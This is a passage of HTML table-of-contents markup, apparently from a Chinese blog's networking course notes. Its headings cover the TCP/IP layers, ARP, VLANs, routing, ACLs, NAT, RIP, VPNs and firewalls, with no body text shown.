class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#12-1TCP-IP%E4%BA%94%E5%B1%82%E5%8D%8F%E8%AE%AE%E6%A0%88"><span class="toc-number">8.13.1.</span> <span class="toc-text">12.1TCP&#x2F;IP五层协议栈</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%89%E5%BA%94%E7%94%A8%E5%B1%82%EF%BC%9A"><span class="toc-number">8.13.1.1.</span> <span class="toc-text">1）应用层：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%EF%BC%9A"><span class="toc-number">8.13.1.2.</span> <span class="toc-text">2）传输层：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%89%E7%BD%91%E7%BB%9C%E5%B1%82%EF%BC%9A"><span class="toc-number">8.13.1.3.</span> <span class="toc-text">3）网络层：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%881%EF%BC%89IP%E5%8C%85%E5%A4%B4%E7%BB%93%E6%9E%84%EF%BC%9A%E6%9C%80%E5%B0%8F%E9%95%BF%E5%BA%A620%E5%AD%97%E8%8A%82%EF%BC%88%E4%B8%8D%E5%8C%85%E6%8B%AC%E5%8F%AF%E9%80%89%E9%A1%B9%EF%BC%89%EF%BC%8C%E5%8F%AF%E9%80%89%E9%A1%B9%E6%9C%80%E5%A4%A7%E5%8F%AF%E8%BE%BE40%E5%AD%97%E8%8A%82%EF%BC%8C%E5%9B%A0%E6%AD%A4IP%E5%8C%85%E5%A4%B4%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6%E5%8F%AF%E8%BE%BE60%E5%AD%97%E8%8A%82"><span class="toc-number">8.13.1.3.1.</span> <span class="toc-text">（1）IP包头结构：最小长度20字节（不包括可选项），可选项最大可达40字节，因此IP包头最大长度可达60字节</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E8%B7%AF%E7%94%B1%EF%BC%9A"><span class="toc-number">8.13.1.3.1.1.</span> <span class="toc-text">–路由：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E8%B7%AF%E7%94%B1%E8%A1%A8%E7%9A%84%E6%9F%A5%E8%AF%A2%E9%A1%BA%E5%BA%8F%EF%BC%9A"><span class="toc-number">8.13.1.3.1.2.</span> <span class="toc-text">–路由表的查询顺序：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">8.13.1.3.1.3.</span> <span class="toc-text">–路由器的工作原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">8.13.1.3.1.4.</span> <span class="toc-text">–相关命令：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E5%AE%9E%E9%AA%8C%EF%BC%9A"><span class="toc-number">8.13.1.3.1.5.</span> <span class="toc-text">–实验：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%882%EF%BC%89ARP%E5%8D%8F%E8%AE%AE"><span class="toc-number">8.13.1.3.2.</span> <span class="toc-text">（2）ARP协议</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E5%B9%BF%E6%92%AD%E4%B8%8E%E5%B9%BF%E6%92%AD%E5%9F%9F"><span class="toc-number">8.13.1.3.2.1.</span> <span class="toc-text">–广播与广播域</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E4%BB%80%E4%B9%88%E6%98%AFARP%E5%8D%8F%E8%AE%AE"><span class="toc-number">8.13.1.3.2.2.</span> <span class="toc-text">–什么是ARP协议</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93ARP%E6%94%BB%E5%87%BB%E4%B8%8E%E6%AC%BA%E9%AA%97"><span class="toc-number">8.13.1.3.2.3.</span> <span class="toc-text">–ARP攻击与欺骗</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93ARP%E9%98%B2%E5%BE%A1"><span class="toc-number">8.13.1.3.2.4.</span> <span class="toc-text">–ARP防御</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%883%EF%BC%89VLAN%EF%BC%88Vitural-LAN-%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91%EF%BC%89%EF%BC%9A%E4%BA%8C%E5%B1%82%E6%8A%80%E6%9C%AF"><span class="toc-number">8.13.1.3.3.</span> <span class="toc-text">（3）VLAN（Vitural LAN 虚拟局域网）：二层技术</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E5%B9%BF%E6%92%AD%E7%9A%84%E5%8D%B1%E5%AE%B3%EF%BC%9A"><span class="toc-number">8.13.1.3.3.1.</span> <span class="toc-text">–广播的危害：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E5%A6%82%E4%BD%95%E6%8E%A7%E5%88%B6%E5%B9%BF%E6%92%AD%EF%BC%9A"><span class="toc-number">8.13.1.3.3.2.</span> <span class="toc-text">–如何控制广播：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E9%87%87%E7%94%A8%E6%96%B0%E7%9A%84%E6%8A%80%E6%9C%AFVLAN%EF%BC%9A"><span class="toc-number">8.13.1.3.3.3.</span> <span class="toc-text">–采用新的技术VLAN：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93VLAN%E7%9A%84%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="toc-number">8.13.1.3.3.4.</span> <span class="toc-text">–VLAN的类型：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93Trunk%EF%BC%9A%E5%A4%9A%E4%B8%AA%E4%BA%A4%E6%8D%A2%E6%9C%BA%E8%BF%9E%E6%8E%A5%E5%90%8C%E4%B8%80%E5%B1%80%E5%9F%9F%E7%BD%91%E5%B9%B6%E8%AE%BE%E7%BD%AEvlan%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">8.13.1.3.3.5.</span> <span class="toc-text">–Trunk：多个交换机连接同一局域网并设置vlan出现的问题</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E9%85%8D%E7%BD%AEtrunk%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">8.13.1.3.3.6.</span> <span class="toc-text">–配置trunk命令：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%AB%AF%E5%8F%A3%E9%93%BE%E8%B7%AF%E7%B1%BB%E5%9E%8B"><span class="toc-number">8.13.1.3.3.7.</span> <span class="toc-text">–交换机端口链路类型</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93Vlan%E6%80%BB%E7%BB%93"><span class="toc-number">8.13.1.3.3.8.</span> <span class="toc-text">–Vlan总结</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1"><span class="toc-number">8.13.1.3.4.</span> <span class="toc-text">（4）单臂路由</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E5%AE%9E%E7%8E%B0%E4%B8%8D%E5%90%8CVlan%E4%B9%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1%EF%BC%88%E9%80%9A%E8%BF%87%E8%B7%AF%E7%94%B1%E5%AE%9E%E7%8E%B0%EF%BC%89"><span class="toc-number">8.13.1.3.4.1.</span> <span class="toc-text">–实现不同Vlan之间的通信（通过路由实现）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1%E6%80%BB%E7%BB%93"><span class="toc-number">8.13.1.3.4.2.</span> <span class="toc-text">–单臂路由总结</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E4%BA%A4%E6%8D%A2%E6%9C%BA%E9%85%8D%E7%BD%AEVTP"><span class="toc-number">8.13.1.3.4.3.</span> <span class="toc-text">–交换机配置VTP</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">8.13.1.3.4.4.</span> <span class="toc-text">–配置DHCP服务的方式</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E5%AE%9E%E9%AA%8C"><span class="toc-number">8.13.1.3.4.5.</span> <span class="toc-text">–实验</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%885%EF%BC%89ICMP%E5%8D%8F%E8%AE%AE"><span class="toc-number">8.13.1.3.5.</span> <span class="toc-text">（5）ICMP协议</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93ICMP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%B0%81%E8%A3%85%E6%A0%BC%E5%BC%8F"><span class="toc-number">8.13.1.3.5.1.</span> <span class="toc-text">–ICMP协议的封装格式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%886%EF%BC%89%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2%E6%9C%BA%EF%BC%88%E6%9B%BF%E4%BB%A3%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1%EF%BC%89%EF%BC%9A%E4%B9%9F%E5%8F%AB%E6%A0%B8%E5%BF%83%E4%BA%A4%E6%8D%A2%E6%9C%BA"><span class="toc-number">8.13.1.3.6.</span> <span class="toc-text">（6）三层交换机（替代单臂路由）：也叫核心交换机</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E7%BB%84%E6%88%90"><span class="toc-number">8.13.1.3.6.1.</span> <span class="toc-text">–三层交换机的组成</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E4%BC%98%E7%82%B9%EF%BC%88%E4%B8%8E%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1%E7%9B%B8%E6%AF%94%EF%BC%89"><span class="toc-number">8.13.1.3.6.2.</span> <span class="toc-text">–三层交换机的优点（与单臂路由相比）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E5%BC%80%E5%90%AF%E4%B8%89%E5%B1%82%E8%B7%AF%E7%94%B1%E5%8A%9F%E8%83%BD%EF%BC%9A%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2%E6%9C%BA%E4%B8%8A%E8%B5%B7%E8%99%9A%E6%8E%A5%E5%8F%A3%EF%BC%88%E9%85%8D%E7%BD%AEvlan%E7%9A%84%E7%BD%91%E5%85%B3%EF%BC%89"><span class="toc-number">8.13.1.3.6.3.</span> <span class="toc-text">–开启三层路由功能：三层交换机上起虚接口（配置vlan的网关）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E5%B0%86%E4%B8%89%E5%B1%82%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%8D%87%E7%BA%A7%E4%B8%BA%E8%B7%AF%E7%94%B1%E7%AB%AF%E5%8F%A3"><span class="toc-number">8.13.1.3.6.4.</span> <span class="toc-text">–将三层路由器的端口升级为路由端口</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E5%AE%9E%E9%AA%8C-1"><span class="toc-number">8.13.1.3.6.5.</span> <span class="toc-text">–实验</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%887%EF%BC%89HSRP%E5%8D%8F%E8%AE%AE-VRRP%E5%8D%8F%E8%AE%AE%EF%BC%9A%E7%83%AD%E5%A4%87%E4%BB%BD%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE"><span class="toc-number">8.13.1.3.7.</span> <span class="toc-text">（7）HSRP协议&#x2F;VRRP协议：热备份路由协议</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E9%85%8D%E7%BD%AE%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">8.13.1.3.7.1.</span> <span class="toc-text">–配置步骤：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4"><span class="toc-number">8.13.1.3.7.2.</span> <span class="toc-text">–配置命令</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93STP%E5%8D%8F%E8%AE%AE"><span class="toc-number">8.13.1.3.7.3.</span> <span class="toc-text">–STP协议</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93PVST%E5%8D%8F%E8%AE%AE%EF%BC%88%E6%80%9D%E7%A7%91%E7%A7%81%E6%9C%89%E7%9A%84%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-number">8.13.1.3.7.4.</span> <span class="toc-text">–PVST协议（思科私有的协议）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E5%AE%9E%E9%AA%8C-2"><span class="toc-number">8.13.1.3.7.5.</span> <span class="toc-text">–实验</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#8%EF%BC%89%E8%A1%A5%E5%85%85%EF%BC%9A%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88%EF%BC%88LACP%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-number">8.13.1.3.8.</span> <span class="toc-text">8）补充：链路聚合（LACP协议）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%EF%BC%89%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82%EF%BC%9A"><span class="toc-number">8.13.1.4.</span> <span class="toc-text">4）数据链路层：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%A7%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-number">8.13.1.4.1.</span> <span class="toc-text">帧结构：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">8.13.1.4.2.</span> <span class="toc-text">交换机工作原理：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%A4%E6%8D%A2%E6%9C%BA-%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9F%BA%E6%9C%AC%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%E5%8F%8A%E5%91%BD%E4%BB%A4%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E6%A8%A1%E6%8B%9F%EF%BC%88PT%E8%BD%AF%E4%BB%B6%EF%BC%89"><span class="toc-number">8.13.1.4.3.</span> <span class="toc-text">交换机&#x2F;路由器基本工作模式及命令：使用工具模拟（PT软件）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F-5%E5%A4%A7%E6%A8%A1%E5%BC%8F"><span class="toc-number">8.13.1.4.3.1.</span> <span class="toc-text">1）工作模式:5大模式</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%91%BD%E4%BB%A4"><span class="toc-number">8.13.1.4.3.2.</span> <span class="toc-text">2）交换机命令</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3%EF%BC%89%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">8.13.1.4.3.3.</span> <span class="toc-text">3）路由器命令</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%93%E5%8C%85%E9%AA%8C%E8%AF%81%E5%B8%A7%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-number">8.13.1.4.4.</span> <span class="toc-text">抓包验证帧结构：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%EF%BC%89%E7%89%A9%E7%90%86%E5%B1%82%EF%BC%9A"><span class="toc-number">8.13.1.5.</span> <span class="toc-text">5）物理层：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%94%E5%B1%82%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84%E5%85%B3%E7%B3%BB%E5%9B%BE%EF%BC%9A"><span class="toc-number">8.13.1.6.</span> <span class="toc-text">五层协议结构关系图：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13ACL"><span class="toc-number">8.14.</span> <span class="toc-text">13ACL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#13-1ALC%E4%B8%BB%E8%A6%81%E5%88%86%E4%B8%BA%E4%BF%A9%E5%A4%A7%E7%B1%BB"><span class="toc-number">8.14.1.</span> <span class="toc-text">13.1ALC主要分为俩大类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%89%E6%A0%87%E5%87%86ACL"><span class="toc-number">8.14.1.1.</span> <span class="toc-text">1）标准ACL</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93%E5%91%BD%E4%BB%A4"><span class="toc-number">8.14.1.1.1.</span> <span class="toc-text">–命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%89%E6%89%A9%E5%B1%95ACL"><span class="toc-number">8.14.1.2.</span> <span class="toc-text">2）扩展ACL</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93%E5%91%BD%E4%BB%A4-1"><span class="toc-number">8.14.1.2.1.</span> <span class="toc-text">–命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%89ACL%E5%8E%9F%E7%90%86"><span class="toc-number">8.14.1.3.</span> <span class="toc-text">3）ACL原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%80%93%E5%AE%9E%E9%AA%8C-3"><span class="toc-number">8.14.1.4.</span> <span class="toc-text">–实验</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%EF%BC%89%E5%91%BD%E5%90%8DACL"><span class="toc-number">8.14.1.5.</span> <span class="toc-text">4）命名ACL</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93%E4%BD%9C%E7%94%A8%EF%BC%9A"><span class="toc-number">8.14.1.5.1.</span> <span class="toc-text">–作用：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93%E4%BC%98%E7%82%B9%EF%BC%9A"><span class="toc-number">8.14.1.5.2.</span> <span class="toc-text">–优点：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93%E5%91%BD%E4%BB%A4-2"><span class="toc-number">8.14.1.5.3.</span> <span class="toc-text">–命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%EF%BC%89%E5%AE%9E%E9%AA%8C"><span class="toc-number">8.14.1.6.</span> <span class="toc-text">5）实验</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14NAT"><span class="toc-number">8.14.2.</span> <span class="toc-text">14NAT</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#14-1IP%E5%9C%B0%E5%9D%80%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">8.14.2.0.1.</span> <span class="toc-text">14.1IP地址的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E5%85%AC%E7%BD%91ip"><span class="toc-number">8.14.2.0.1.1.</span> <span class="toc-text">1）公网ip</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89%E7%A7%81%E7%BD%91ip"><span class="toc-number">8.14.2.0.1.2.</span> <span class="toc-text">2）私网ip</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#14-2NAT%E7%9A%84%E4%B8%89%E5%A4%A7%E7%B1%BB"><span class="toc-number">8.14.2.0.2.</span> <span class="toc-text">14.2NAT的三大类</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%EF%BC%89%E9%9D%99%E6%80%81NAT"><span class="toc-number">8.14.2.0.2.1.</span> <span class="toc-text">1）静态NAT</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%EF%BC%89%E5%8A%A8%E6%80%81NAT%EF%BC%88%E5%9F%BA%E6%9C%AC%E4%B8%8D%E7%94%A8%EF%BC%89"><span class="toc-number">8.14.2.0.2.2.</span> <span class="toc-text">2）动态NAT（基本不用）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3%EF%BC%89PAT%EF%BC%88%E7%AB%AF%E5%8F%A3%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%EF%BC%9APort-Address-Translation%EF%BC%89-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E6%8A%80%E6%9C%AF"><span class="toc-number">8.14.2.0.2.3.</span> <span class="toc-text">3）PAT（端口地址转换：Port Address Translation）-端口复用技术</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#14-3NAT%E5%91%BD%E4%BB%A4"><span class="toc-number">8.14.2.0.3.</span> <span class="toc-text">14.3NAT命令</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E5%AE%9E%E9%AA%8C-4"><span class="toc-number">8.14.2.0.3.1.</span> <span class="toc-text">–实验</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1"><span class="toc-number">8.14.3.</span> <span class="toc-text">15动态路由</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#15-1%E6%8C%89%E7%85%A7%E8%B7%AF%E7%94%B1%E6%89%A7%E8%A1%8C%E7%9A%84%E7%AE%97%E6%B3%95%E5%88%86%E7%B1%BB%EF%BC%88%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%86%E7%B1%BB%EF%BC%89"><span class="toc-number">8.14.3.1.</span> <span class="toc-text">15.1按照路由执行的算法分类（路由协议的分类）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%EF%BC%89RIP"><span class="toc-number">8.14.3.1.1.</span> <span class="toc-text">1）RIP</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">8.14.3.1.1.1.</span> <span class="toc-text">–基本概念</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E5%91%BD%E4%BB%A4-3"><span class="toc-number">8.14.3.1.1.2.</span> <span class="toc-text">–命令</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C"><span class="toc-number">8.14.3.1.1.3.</span> <span class="toc-text">–综合实验</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16VPN"><span class="toc-number">8.14.4.</span> <span class="toc-text">16VPN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#16-1vpn%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">8.14.4.1.</span> <span class="toc-text">16.1vpn的作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#16-2VPN%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">8.14.4.2.</span> <span class="toc-text">16.2VPN的类型</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%EF%BC%89%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AEVPN%EF%BC%88Remote-Access-VPN%EF%BC%89"><span class="toc-number">8.14.4.2.1.</span> <span class="toc-text">1）远程访问VPN（Remote Access VPN）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%EF%BC%89%E7%82%B9%E5%88%B0%E7%82%B9VPN"><span class="toc-number">8.14.4.2.2.</span> <span class="toc-text">2）点到点VPN</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#16-3%E7%82%B9%E5%88%B0%E7%82%B9VPN%EF%BC%9AIPsecVPN"><span class="toc-number">8.14.4.3.</span> <span class="toc-text">16.3点到点VPN：IPsecVPN</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%EF%BC%89IPsecVPN%E5%88%86%E4%B8%BA2%E5%A4%A7%E9%98%B6%E6%AE%B5%EF%BC%9A"><span class="toc-number">8.14.4.3.1.</span> <span class="toc-text">1）IPsecVPN分为2大阶段：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%EF%BC%9A%E7%AE%A1%E7%90%86%E8%BF%9E%E6%8E%A5"><span class="toc-number">8.14.4.3.1.1.</span> <span class="toc-text">–第一阶段：管理连接</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%EF%BC%9A%E6%95%B0%E6%8D%AE%E8%BF%9E%E6%8E%A5"><span class="toc-number">8.14.4.3.1.2.</span> <span class="toc-text">–第二阶段：数据连接</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%93%E6%9C%80%E5%90%8E%E4%B8%80%E6%AD%A5%EF%BC%9A%E8%AE%A9%E9%85%8D%E7%BD%AE%E5%9C%A8%E7%AB%AF%E5%8F%A3%E4%B8%8A%E7%94%9F%E6%95%88"><span class="toc-number">8.14.4.3.1.3.</span> <span class="toc-text">–最后一步：让配置在端口上生效</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%EF%BC%89%E5%BD%93%E5%A4%96%E7%BD%91%E7%AB%AF%E5%8F%A3%E5%90%8C%E6%97%B6%E9%85%8D%E7%BD%AE%E4%BA%86PAT%E5%92%8CNAT%E5%90%8E%EF%BC%8C%E7%94%9F%E6%95%88%E7%9A%84%E5%85%88%E5%90%8E%E9%A1%BA%E5%BA%8F%EF%BC%9F"><span class="toc-number">8.14.4.3.2.</span> <span class="toc-text">2）当外网端口同时配置了PAT和NAT后，生效的先后顺序？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%EF%BC%89%E5%AE%9E%E9%AA%8C"><span class="toc-number">8.14.4.3.3.</span> <span class="toc-text">3）实验</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#16-3%E8%BF%9C%E7%A8%8BVPN%EF%BC%9A"><span class="toc-number">8.14.4.4.</span> <span class="toc-text">16.3远程VPN：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%EF%BC%89%E5%AE%9E%E9%AA%8C"><span class="toc-number">8.14.4.4.1.</span> <span class="toc-text">1）实验</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%94%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">8.14.4.4.1.1.</span> <span class="toc-text">—准备工作</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%94%E5%BC%80%E5%A7%8B%E5%9C%A8XP%E4%B8%8A%E6%8B%A8%E5%8F%B7%E5%BB%BA%E7%AB%8BVPN%E8%BF%9E%E6%8E%A5%EF%BC%88PPTP%EF%BC%89%EF%BC%88%E8%BF%87%E7%A8%8B%E9%9A%8Fwindows%E7%89%88%E6%9C%AC%E5%8F%98%E5%8C%96%E8%80%8C%E5%8F%98%E5%8C%96%EF%BC%89"><span class="toc-number">8.14.4.4.1.2.</span> <span class="toc-text">—开始在XP上拨号建立VPN连接（PPTP）（过程随windows版本变化而变化）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%80%94%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86%EF%BC%9APC%E4%B9%9F%E6%9C%89%E8%B7%AF%E7%94%B1%E8%A1%A8"><span class="toc-number">8.14.4.4.1.3.</span> <span class="toc-text">—扩展知识：PC也有路由表</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">8.14.5.</span> <span class="toc-text">17防火墙</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 